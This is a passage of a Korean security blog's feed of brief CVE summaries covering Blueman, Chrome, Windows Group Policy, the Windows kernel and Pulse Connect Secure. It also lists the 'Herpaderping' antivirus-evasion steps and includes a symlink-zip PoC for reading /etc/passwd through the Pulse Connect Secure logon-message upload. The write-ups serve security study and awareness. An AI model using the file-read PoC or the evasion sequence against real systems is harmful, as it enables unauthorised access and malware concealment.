    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 &#xC774;&#xC804; &#xBC84;&#xC804;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)&#xB294; IPC &#xD639;&#xC740; RPC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. D-bus&#xC758; DHCPClient &#xBA54;&#xC18C;&#xB4DC;&#xC640; Blueman &#xC0AC;&#xC774;&#xC5D0; arguments sanitizing &#xACFC;&#xC815;&#xC774; &#xC5C6;&#xC5B4; argument injection&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xAD6C;&#xC131;&#xC5D0; &#xB530;&#xB77C; impact&#xAC00; 2&#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs routeros">1. isc-dhcp-client &#xC0AC;&#xC6A9; &#xC2DC;<span class="hljs-built_in">ip </span>&#xBA85;&#xB839;&#xC5B4;&#xC5D0; argument injection, &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xB294; Dos2. dhcpd package &#xC0AC;&#xC6A9; &#xC2DC;<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>&#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;</code></pre><p>&#xB300;&#xBD80;&#xBD84;&#xC758;  D-bus &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; PolicyKit&#xC73C;&#xB85C; Authentication&#xC744; &#xAC70;&#xCE58;&#xC9C0;&#xB9CC; Blueman 2.0.6 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC740; Polkit-1&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC5B4;, &#xBAA8;&#xB4E0; &#xB85C;&#xCEEC; &#xC720;&#xC800;&#xAC00; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449&#xB294; Chrome&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; blink &#xC5D4;&#xC9C4;&#xC758; <code>WebAudio</code> &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Use-After-Free &#xCDE8;&#xC57D;&#xC810; &#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>DeferredTaskHandler::BreakConnections</code> &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>active_source_handlers_</code>&#xB294; <code>finished_source_handlers_</code> &#xC758; &#xC6D0;&#xC2DC; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD65C;&#xC131; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xBA70; &#xC0AC;&#xC6A9;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xC774;&#xD6C4;&#xC5D0;&#xB294; &#xD560;&#xB2F9;&#xB41C; <code>active_source_handlers_</code> &#xC640; <code>finished_source_handlers_</code> &#xAC00; &#xAC19;&#xC774; free&#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xC5EC; <code>BaseAudioContext::Uninitialize</code> &#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xC774;&#xD6C4; <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; <code>active_source_handlers_</code> &#xB9CC; free&#xB418;&#xACE0; <code>finished_source_handlers_</code> &#xC5D0; free&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB0A8;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>DeferredTaskHandler::BreakConnections</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; UAF &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16939: Windows Group Policy DACL overwrite를 이용한 권한 상승</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xADF8;&#xB8F9; &#xC815;&#xCC45; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xC218;&#xD589;&#xB418;&#xB294;  <code>SetSecurityFile</code>&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>gpupdate /target:user /force</code> &#xC2E4;&#xD589; &#xC2DC; <code>SetSecurityFile</code>&#xB294; impersonation &#xC5C6;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB8F9; &#xC815;&#xCC45; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xD6C4; <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>&#xC758; &#xC18C;&#xC720;&#xC790;&#xB294; Administrators&#xAC00; &#xB418;&#xACE0; User &#xADF8;&#xB8F9;&#xC740; &#xC77D;&#xAE30; &#xBC0F; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xB9CC; &#xAC16;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xD558;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778; <code>\Datastore\0\sysvol</code>&#xC758; &#xC18C;&#xC720;&#xC790;&#xB294; User&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAD8C;&#xD55C;&#xC774; &#xB0AE;&#xB354;&#xB77C;&#xB3C4; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>sysvol</code> &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC544;&#xB798;&#xC5D0; &#xAD8C;&#xD55C;&#xC744; &#xC218;&#xC815;&#xD560; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; Junction&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; &#xADF8;&#xB8F9; &#xC815;&#xCC45; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC640; &#xD3F4;&#xB354; &#xB0B4;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xBAA8;&#xB450; DACL Write&#xC758; &#xB300;&#xC0C1;&#xC774; &#xB418;&#xBA70;  DACL Write &#xC911; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xC218;&#xC815;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xD558;&#xB294; &#xBC29;&#xBC95; &#xC911; &#xD558;&#xB098;&#xB294; DACL Write&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xAE30; &#xC804;&#xC5D0; <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; juction&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>&#xC774;&#xB77C;&#xB294; Detection Evasion &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; Process object&#xC758; &#xC0DD;&#xC131;&#xACFC; Initial Thread &#xC0BD;&#xC785; &#xACFC;&#xC815; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xD558;&#xB294; &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xACE0;&#xC790; &#xD30C;&#xC77C;&#xC5D0; write &#xC791;&#xC5C5;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; <code>on-write scanning</code>&#xC774; &#xB3C4;&#xC785;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xC774; <code>on-write scanning</code>&#xC774; <code>IRP_MJ_CLEANUP</code>(== file handle close)&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xC804;&#xAE4C;&#xC9C0; &#xD30C;&#xC77C;&#xC758; &#xC218;&#xC815; &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC21C;&#xC11C;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handle&#xC744; &#xACC4;&#xC18D; &#xC5F4;&#xC5B4;&#xB193;&#xB294;&#xB2E4;.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> &#xC2E4;&#xD589;&#xD30C;&#xC77C; &#xC218;&#xC815;<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure &#x2013; Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN &#xC11C;&#xBE44;&#xC2A4;&#xC778; Pulse Connect Secure&#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC628; &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xC545;&#xC6A9;&#xD574; arbitrary file read&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD00;&#xB9AC;&#xC790;&#xB294; &#xB85C;&#xADF8;&#xC778; &#xC2DC; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; <code>/dana-admin/auth/signinNotf.cgi</code> &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;, <code>en.txt</code> &#xBC0F; <code>default.txt</code> &#xD30C;&#xC77C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; zip &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xB85C;&#xADF8;&#xC628; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; zip &#xD30C;&#xC77C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xC77C;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; read &#xD560; &#xD30C;&#xC77C;&#xC744; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294; arbitrary file read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; <code>/etc/passwd</code> &#xD30C;&#xC77C;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; POC&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xD30C;&#xC77C;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC124;&#xC815;&#xD574; zip&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xD55C; &#xB4A4; <code>/dana-admin/auth/signinNotf.cgi</code> &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xBA74; &#xB85C;&#xADF8;&#xC628; &#xD398;&#xC774;&#xC9C0;&#xC5D0; <code>/etc/passwd</code>&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC9C0;&#xB09C; 9&#xC6D4; &#xCEE4;&#xB110; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xBAA8;&#xB4C8;&#xC740; <code>ntoskrnl.exe</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>EtwpNotifyGuid</code>&#xC5D0;&#xC11C; <code>cmp [rdi+0Ch], r12b</code>&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370; <code>r12b</code>&#xC758; &#xCD08;&#xAE30;&#xD654; &#xAC12;&#xC740; 4&#xC774;&#xC9C0;&#xB9CC; 1&#xB85C; &#xB9AC;&#xC14B;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. <code>byte ptr[rdi+0Ch]</code>&#xAC00; 1&#xC758; &#xAC12;&#xACFC; &#xAC19;&#xB2E4;&#xBA74; <code>rdi+18h</code> &#xAC12;&#xC740; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>UmReplyObject</code>&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. <code>twpQueueNotification</code>&#xC5D0;&#xC11C; <code>UmReplyObject</code>&#xAC00; &#xCC38;&#xC870;&#xB41C; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC73C;&#xBA74; <code>bl</code>&#xC758; &#xAC12;&#xC740; 0&#xC774;&#xACE0; <code>rbp+0Ch</code>&#xAC00; 0&#xC774; &#xC544;&#xB2D0; &#xC2DC; <code>rbp+18h</code>&#xB294; &#xAC1D;&#xCCB4;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><code>rbp+0Ch</code>&#xB294;  <code>EtwpNotifyGuid</code>&#xC5D0;&#xC11C;&#xB294; 1&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xC5EC; <code>UmReplyObject</code>&#xB97C; &#xB9CC;&#xB4E4;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xC9C0;&#xB9CC; &#xB9C8;&#xC9C0;&#xB9C9; &#xBE44;&#xAD50;&#xC5D0;&#xC11C; 0&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC77C;&#xAD00;&#xC131; &#xC5C6;&#xB294; &#xBE44;&#xAD50;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; &#xBE44;&#xAD50;&#xD55C; &#xAC12;&#xC774; 1&#xC774;&#xB098; 0&#xC774; &#xC544;&#xB2D0; &#xACBD;&#xC6B0; &#xAC1D;&#xCCB4; &#xC8FC;&#xC18C;&#xAC00; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; <code>ObfReferenceObject</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>&#xC5F0;&#xC0B0;&#xC774; &#xC218;&#xD589;&#xB418;&#xC5B4; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC99D;&#xAC00;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; Windows 10 RS4 &#xC774;&#xC0C1;&#xC758; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC758; &#xAD8C;&#xD55C; &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidra를 사용해보자!</title>
    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>&#xD558;&#xC9C0;&#xBA54;&#xB9C8;&#xC2DC;&#xB5BC;! &#xBC18;&#xAC11;&#xC2B5;&#xB2C8;&#xB2E4; &#xC624;&#xB298;&#xB3C4; &#xB768;&#xB768;&#xD55C; idioth&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC624;&#xB298; &#xC18C;&#xAC1C;&#xD574;&#xB4DC;&#xB9B4; &#xD234;&#xC740; AngryGhidra&#xB77C;&#xB294; &#xD234;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB204;&#xAD70;&#xAC00;(?)&#xAC00; &#xC62C;&#xB824;&#xC900; &#xB9C1;&#xD06C;&#xB97C; &#xBCF4;&#xACE0; &#xC624; &#xC774;&#xAC70; &#xD3B8;&#xD558;&#xACA0;&#xB294;&#xB370; &#xD55C; &#xBC88; &#xC368;&#xBCFC;&#xAE4C;? &#xD558;&#xACE0; &#xC368;&#xBD24;&#xB2E4;&#xAC00; &#xC0AC;&#xC6A9;&#xD574;&#xBCFC; &#xB9CC;&#xD55C; &#xAC00;&#xCE58;&#xAC00; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p><p><a href="https://github.com/angr/angr">angr</a>&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD574;&#xB4DC;&#xB9AC;&#xC790;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D;&#xC744; &#xB3C4;&#xC640;&#xC8FC;&#xB294; python &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xC874; angr&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xBA74; IDA&#xC640; &#xAC19;&#xC740; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xACE0; python &#xCF54;&#xB4DC;&#xC5D0;&#xB2E4;&#xAC00; &#xC801;&#xACE0;&#x2026; &#xB2E4;&#xC2DC; &#xAD6C;&#xD558;&#xACE0; &#xCF54;&#xB4DC;&#xC5D0;&#xB2E4;&#xAC00; &#xC801;&#xACE0; &#xD558;&#xB294; &#xB178;&#xAC00;&#xB2E4;&#xB97C; &#xC9C4;&#xD589;&#xD574;&#xC57C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xB140;&#xC11D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; Ghidra&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xD074;&#xB9AD;&#xC9C8;&#xB9CC; &#xBA87; &#xBC88; &#xD558;&#xBA74; angr&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xB141; &#xBA39;&#xACE0; &#xC640;&#xC11C; &#xACF5;&#xBD80;&#xB3C4; &#xD558;&#xAE30; &#xC2EB;&#xACA0;&#xB2E4;&#x2026; &#xC694;&#xAC70;&#xB098; &#xC138;&#xD305;&#xD574;&#xC11C; &#xC368;&#xBCF4;&#xBA74;&#xC11C; &#xAC16;&#xACE0; &#xB180;&#xC544;&#xBD10;&#xC57C;&#xACA0;&#xB2E4;&#x2026; &#xD788;&#xD788;&#xD788; &#xD558;&#xB294; &#xC0DD;&#xAC01;&#xC740; 30&#xBD84; &#xB9CC;&#xC5D0; &#xAE68;&#xC838;&#xBC84;&#xB9AC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xC0BD;&#xC9C8;"><a href="#&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xC0BD;&#xC9C8;" class="headerlink" title="&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xC0BD;&#xC9C8;"></a>&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xC0BD;&#xC9C8;</h1><p>&#xBD84;&#xBA85; Readme.md&#xC5D0;&#xC11C;&#xB294; 